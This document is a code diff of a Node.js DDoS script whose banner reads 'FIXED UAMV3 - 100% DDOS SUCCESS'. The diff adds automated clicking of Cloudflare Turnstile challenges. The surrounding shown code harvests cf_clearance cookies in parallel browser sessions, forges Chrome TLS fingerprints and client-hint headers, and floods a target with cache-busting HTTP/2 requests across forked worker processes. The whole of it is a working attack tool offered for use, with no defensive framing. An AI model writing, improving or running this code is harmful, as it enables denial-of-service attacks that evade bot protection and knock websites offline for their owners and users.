@@ -8,6 +8,100 @@ const fs = require("fs");
 const os = require("os");
 const HPACK = require('hpack');
 
+async function detectChallenge(page) {
+    try {
+        const title = await page.title();
+        const content = await page.content();
+
+        if (title === "Attention Required! | Cloudflare") {
+            throw new Error("Proxy blocked");
+        }
+
+        if (content.includes("challenge-platform") === true || title.includes("Just a moment")) {
+            await new Promise(r => setTimeout(r, 6000));
+
+            try {
+                await page.waitForSelector('iframe[src*="cloudflare"]', { timeout: 5000 })
+                    .then(async iframe => {
+                        const frame = await iframe.contentFrame();
+                        await frame.waitForSelector('input[type="checkbox"]', { timeout: 5000 });
+                        await frame.click('input[type="checkbox"]');
+                    })
+                    .catch(() => {});
+            } catch (err) {}
+
+            const elements = await page.$$('[name="cf-turnstile-response"]');
+            if (elements.length > 0) {
+                for (const element of elements) {
+                    try {
+                        const parentElement = await element.evaluateHandle((el) => el.parentElement);
+                        const box = await parentElement.boundingBox();
+                        let x = box.x + 30;
+                        let y = box.y + box.height / 2;
+                        await page.mouse.click(x, y);
+                    } catch (err) {}
+                }
+            }
+
+            const coordinates = await page.evaluate(() => {
+                let coords = [];
+                document.querySelectorAll("div").forEach((item) => {
+                    try {
+                        let rect = item.getBoundingClientRect();
+                        let css = window.getComputedStyle(item);
+                        if (
+                            css.margin === "0px" &&
+                            css.padding === "0px" &&
+                            rect.width > 290 &&
+                            rect.width <= 310 &&
+                            !item.querySelector("*")
+                        ) {
+                            coords.push({
+                                x: rect.x,
+                                y: rect.y,
+                                w: rect.width,
+                                h: rect.height,
+                            });
+                        }
+                    } catch (e) {}
+                });
+                if (coords.length === 0) {
+                    document.querySelectorAll("div").forEach((item) => {
+                        try {
+                            let rect = item.getBoundingClientRect();
+                            if (rect.width > 290 && rect.width <= 310 && !item.querySelector("*")) {
+                                coords.push({
+                                    x: rect.x,
+                                    y: rect.y,
+                                    w: rect.width,
+                                    h: rect.height,
+                                });
+                            }
+                        } catch (e) {}
+                    });
+                }
+                return coords;
+            });
+
+            for (const item of coordinates) {
+                try {
+                    let x = item.x + 30;
+                    let y = item.y + item.h / 2;
+                    await page.mouse.click(x, y);
+                } catch (err) {}
+            }
+            await new Promise(r => setTimeout(r, 6000));
+            await new Promise(r => setTimeout(r, 5000));
+            return;
+        }
+        await new Promise(r => setTimeout(r, 3000));
+        return;
+    } catch (error) {
+        await new Promise(r => setTimeout(r, 3000));
+        return;
+    }
+}
+
 function getAdvancedChromeTlsOptions(parsedTarget) {
     const chromeProfiles = [
         {
@@ -39,20 +133,17 @@ function getAdvancedChromeTlsOptions(parsedTarget) {
             ]
         }
     ];
-
     const profile = chromeProfiles[Math.floor(Math.random() * chromeProfiles.length)];
     const supportedGroups = ['x25519', 'secp256r1', 'secp384r1'];
     const sigAlgs = [
         'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384',
         'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512'
     ];
-    
     const shuffledCiphers = [...profile.ciphers];
     if (Math.random() < 0.05) {
         const i = shuffledCiphers.length - 1, j = Math.max(0, i - 1);
         [shuffledCiphers[i], shuffledCiphers[j]] = [shuffledCiphers[j], shuffledCiphers[i]];
     }
-
     return {
         ciphers: shuffledCiphers.join(':'),
         sigalgs: sigAlgs.join(':'),
@@ -70,28 +161,21 @@ function getAdvancedChromeTlsOptions(parsedTarget) {
 function generateAdvancedBrowserHeaders(userAgentFromBypass) {
     const chromeVersion = parseInt((userAgentFromBypass.match(/Chrome\/(\d+)/) || [])[1] || '131');
     const fullVersion = `${chromeVersion}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)}`;
-
     const brandTemplates = [
         `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not-A.Brand";v="99"`,
         `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not;A=Brand";v="8"`,
         `"Not)A;Brand";v="99", "Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}"`
     ];
     const brandValue = brandTemplates[Math.floor(Math.random() * brandTemplates.length)];
-
     const platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"'];
     const platform = platforms[Math.floor(Math.random() * platforms.length)];
-
     const archs = ['"x86"', '"arm"', '"x64"', '""'];
     const arch = archs[Math.floor(Math.random() * archs.length)];
-
     const models = ['""', '"Intel Mac OS X 10_15_7"', '"Windows NT 10.0; Win64; x64"', '"SM-G960F"'];
     const model = models[Math.floor(Math.random() * models.length)];
-
     const bitness = ['"64"', '"32"', '""'][Math.floor(Math.random() * 3)];
-
     const colorSchemes = ['light', 'dark', 'no-preference'];
     const colorScheme = colorSchemes[Math.floor(Math.random() * colorSchemes.length)];
-
     const languages = [
         "en-US,en;q=0.9,vi;q=0.8",
         "en-GB,en;q=0.9",
@@ -100,7 +184,6 @@ function generateAdvancedBrowserHeaders(userAgentFromBypass) {
         "es-ES,es;q=0.9,en;q=0.8"
     ];
     const acceptLanguage = languages[Math.floor(Math.random() * languages.length)];
-
     return {
         "sec-ch-ua": brandValue,
         "sec-ch-ua-mobile": platform === '"Android"' ? "?1" : "?0",
@@ -209,8 +292,7 @@ async function bypassCloudflareOnce(attemptNum = 1) {
         browser = response.browser;
         page = response.page;
         await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 45000 });
-        console.log("\x1b[36m[+] CHECKING FOR CLOUDFLARE CHALLENGE...\x1b[0m");
-        
+        await detectChallenge(page);
         let challengeCompleted = false;
         let waitCount = 0;
         while (!challengeCompleted) {
@@ -226,15 +308,12 @@ async function bypassCloudflareOnce(attemptNum = 1) {
                 console.log(`\x1b[33m[+] STILL WAITING FOR CF_CLEARANCE COOKIE... (${waitCount * 0.5} SECONDS ELAPSED)\x1b[0m`);
             }
         }
-
         const cookies = await page.cookies();
         const userAgent = await page.evaluate(() => navigator.userAgent);
         await browser.close();
-        
         if (!cookies.some(c => c.name === "cf_clearance")) {
              throw new Error("CF_CLEARANCE COOKIE NOT FOUND AFTER WAIT.");
         }
-
         console.log(`\x1b[32m[+] BYPASS ATTEMPT ${attemptNum} SUCCESSFUL.\x1b[0m`);
         return { cookies, userAgent, success: true, attemptNum };
     } catch (error) {
@@ -246,19 +325,15 @@ async function bypassCloudflareOnce(attemptNum = 1) {
 
 async function bypassCloudflareParallel(totalCount) {
     console.log("\x1b[35m[+] CLOUDFLARE BYPASS - PARALLEL MODE\x1b[0m");
-    
     const results = [];
     let attemptCount = 0;
     const batchSize = 3;
-    
     while (results.length < totalCount) {
         const remaining = totalCount - results.length;
         const currentBatchSize = Math.min(batchSize, remaining);
         console.log(`\x1b[33m[+] STARTING PARALLEL BATCH (${currentBatchSize} SESSIONS)...\x1b[0m`);
-        
         const batchPromises = Array.from({ length: currentBatchSize }, () => bypassCloudflareOnce(++attemptCount));
         const batchResults = await Promise.all(batchPromises);
-        
         for (const result of batchResults) {
             if (result.success && result.cookies.length > 0) {
                 results.push(result);
@@ -275,11 +350,9 @@ async function bypassCloudflareParallel(totalCount) {
 async function runFlooder() {
     const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
     if (!bypassInfo || !bypassInfo.userAgent) return;
-
     const cookieString = bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ");
     const advancedHeaders = generateAdvancedBrowserHeaders(bypassInfo.userAgent);
     const tlsOptions = getAdvancedChromeTlsOptions(parsedTarget);
-
     const client = http2.connect(args.target, {
         createConnection: (authority, option) => {
             return tls.connect({
@@ -296,10 +369,8 @@ async function runFlooder() {
             maxHeaderListSize: 4096
         }
     });
-
     const connectionId = Math.random().toString(36).substring(2);
     global.activeConnections.add(connectionId);
-
     client.on('connect', async () => {
         const attackInterval = setInterval(async () => {
             if (client.destroyed) {
@@ -309,10 +380,8 @@ async function runFlooder() {
             try {
                 for (let i = 0; i < args.Rate; i++) {
                     await new Promise(r => setTimeout(r, 50 + Math.floor(Math.random() * 150)));
-
                     const querySeparator = parsedTarget.path.includes('?') ? '&' : '?';
                     const pathWithBuster = parsedTarget.path + querySeparator + generateCacheBuster();
-
                     let headers = {
                         ":method": "GET",
                         ":authority": parsedTarget.host,
@@ -322,12 +391,9 @@ async function runFlooder() {
                         "cookie": cookieString,
                         ...advancedHeaders
                     };
-
                     const headerOrder = getBrowserLikeHeaderOrder();
                     headers = buildHeadersInOrder(headers, headerOrder);
-
                     const req = client.request(headers);
-
                     req.on('response', (resHeaders) => {
                         const status = resHeaders[':status'];
                         if (!global.statuses[status]) global.statuses[status] = 0;
@@ -335,25 +401,21 @@ async function runFlooder() {
                         global.totalRequests = (global.totalRequests || 0) + 1;
                         req.close();
                     });
-
                     req.on('error', () => {
                         if (!global.statuses["ERROR"]) global.statuses["ERROR"] = 0;
                         global.statuses["ERROR"]++;
                         global.totalRequests = (global.totalRequests || 0) + 1;
                         req.close();
                     });
-
                     req.end();
                 }
             } catch (e) {}
         }, 1000);
-
         setTimeout(() => {
             clearInterval(attackInterval);
             client.close();
         }, 30000);
     });
-
     const cleanup = () => {
         global.activeConnections.delete(connectionId);
         client.destroy();
@@ -365,14 +427,12 @@ async function runFlooder() {
 function displayStats() {
     const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
     const remaining = Math.max(0, args.time - elapsed);
-    
     console.clear();
     console.log("\x1b[35m[+] FIXED UAMV3 - 100% DDOS SUCCESS\x1b[0m");
     console.log(`\x1b[36m[+] TARGET:\x1b[0m ${args.target}`);
     console.log(`\x1b[36m[+] TIME:\x1b[0m ${elapsed}S / ${args.time}S`);
     console.log(`\x1b[36m[+] REMAINING:\x1b[0m ${remaining}S`);
     console.log(`\x1b[36m[+] CONFIG:\x1b[0m RATE: ${args.Rate}/S | THREADS: ${args.threads} | SESSION: ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} REQUESTED`);
-
     let totalStatuses = {};
     let totalRequests = 0;
     for (let w in global.workers) {
@@ -391,7 +451,6 @@ function displayStats() {
     console.log(`   \x1b[36m[+] TOTAL REQUESTS:\x1b[0m ${totalRequests}`);
     console.log(`   \x1b[33m[+] RATE:\x1b[0m ${elapsed > 0 ? (totalRequests / elapsed).toFixed(2) : 0} REQ/S`);
     console.log(`   \x1b[32m[+] STATUS CODES:\x1b[0m`, totalStatuses);
-
     const progress = Math.floor((elapsed / args.time) * 30);
     const progressBar = "█".repeat(progress) + "░".repeat(30 - progress);
     console.log(`\n\x1b[36m[+] PROGRESS: [\x1b[32m${progressBar}\x1b[36m]\x1b[0m`);
@@ -421,53 +480,42 @@ const parsedTarget = url.parse(args.target);
 if (cluster.isMaster) {
     console.clear();
     console.log("\x1b[35m[+] FIXED UAMV3 - 100% DDOS SUCCESS\x1b[0m");
-    
     (async () => {
         const bypassResults = await bypassCloudflareParallel(args.cookieCount);
         global.bypassData = bypassResults;
-        
         console.log(`\x1b[32m[+] SUCCESSFULLY OBTAINED ${bypassResults.length} SESSION(S)!\x1b[0m`);
         console.log("\x1b[32m[+] STARTING ATTACK...\x1b[0m");
-        
         global.startTime = Date.now();
-        
         for (let i = 0; i < args.threads; i++) {
             const worker = cluster.fork();
             worker.send({ type: 'bypassData', data: bypassResults });
         }
-        
         const statsInterval = setInterval(displayStats, 1000);
-        
         cluster.on('message', (worker, message) => {
             if (message.type === 'stats') {
                 global.workers[worker.id] = [worker, message];
             }
         });
-        
         cluster.on('exit', (worker) => {
              if (Date.now() - global.startTime < args.time * 1000) {
                  const newWorker = cluster.fork();
                  newWorker.send({ type: 'bypassData', data: global.bypassData });
              }
         });
-        
         setTimeout(() => {
             clearInterval(statsInterval);
             console.log("\x1b[32m[+] ATTACK COMPLETED!\x1b[0m");
             process.exit(0);
         }, args.time * 1000);
     })();
-    
 } else {
     let statusesQ = [];
     global.totalRequests = 0;
     global.statuses = {};
-    
     process.on('message', (msg) => {
         if (msg.type === 'bypassData') {
             global.bypassData = msg.data;
             setInterval(() => runFlooder(), 500);
-            
             setInterval(() => {
                 if (Object.keys(global.statuses).length > 0) {
                     if (statusesQ.length >= 4) statusesQ.shift();
@@ -482,7 +530,6 @@ if (cluster.isMaster) {
             }, 250);
         }
     });
-    
     setTimeout(() => process.exit(0), args.time * 1000);
 }
 
